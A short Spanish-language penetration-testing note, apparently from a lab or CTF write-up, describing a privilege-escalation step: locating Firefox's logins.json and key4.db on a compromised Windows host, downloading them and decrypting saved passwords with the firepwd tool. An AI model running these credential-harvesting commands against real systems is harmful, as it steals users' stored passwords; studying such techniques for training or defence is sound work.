
# CONTEXTO
Deberemos de ver en alguna parte de la máquina rastros del firefox. Tendremos que entrar a nuestro directorio personal de usuario y acceder a AppData\Roaming\Mozilla\Firefox\Profiles\ Ahora en una de las dos carpetas deberemos de ver un logins.json y un key4.db.

# ESCALADA
```shell
#NOS CLONAMOS EL REPOSITORIO
git clone https://github.com/lclevy/firepwd
cd firepwd
pip3 install -r requirements.txt --break-system-packages

#NOS DESCARGAMOS EL RECURSO
download logins.json logins.json
download key4.db key4.db

#MOVEMOS LOS RECURSOS
cp ../key4.db .
cp ../logins.json .

#EJECUTAMOS LA HERRAMIENTA
python3 firepwd.py
```